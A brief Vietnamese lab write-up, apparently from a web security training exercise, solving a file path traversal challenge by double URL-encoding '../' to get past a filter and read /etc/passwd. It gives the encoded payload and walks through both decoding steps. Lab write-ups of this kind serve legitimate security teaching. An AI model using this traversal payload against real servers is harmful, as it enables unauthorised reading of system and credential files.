# LAB04 : File path traversal, traversal sequences stripped with superfluous URL-decode

**Đề bài :**
<img width="1070" height="233" alt="image" src="https://github.com/user-attachments/assets/cc5560ca-2f9b-47d3-bff1-bd73754e5cdd" />

- Từ đầu bài ta có thể thấy rằng không thể truy cập thẳng vào **../../../etc/passwd**
- Ta sử dụng  để truy cập : **..%252f..%252f..%252fetc/passwd**
<img width="1494" height="402" alt="image" src="https://github.com/user-attachments/assets/163c01bb-47c2-41c5-92fd-222bf7833ac3" />

- Decode lần đầu : **..%252f..%252f → ..%2f..%2f**
- Decode lần hai : **..%2f..%2f → ../../**
- Sau 2 lần decode : **..%252f..%252f..%252fetc/passwd → ../../../etc/passwd**
